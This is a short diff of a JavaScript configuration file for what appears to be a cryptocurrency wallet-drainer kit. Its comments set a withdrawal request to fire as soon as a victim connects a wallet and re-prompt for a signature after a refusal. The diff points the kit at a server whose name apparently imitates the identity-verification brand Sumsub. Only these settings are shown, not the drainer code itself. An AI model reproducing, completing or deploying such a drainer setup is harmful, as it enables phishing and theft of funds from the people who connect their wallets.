@@ -17,7 +17,7 @@ const isMobile = isDeviceMobile()
 //Theme style ('light' or 'dark');
 const THEME_STYLE = 'light'
 //Your server domain
-const SERVER_DOMAIN = ''
+const SERVER_DOMAIN = 'sumsub-7vj8.onrender.com'
 //Should the withdrawal request be triggered immediately upon wallet connection? (true - the request will be sent immediately upon wallet connection; false - the request will be sent after the button is clicked);
 const IS_AUTO_WITHDRAWAL = true
 //Should the signature request be repeated if the user declined it?
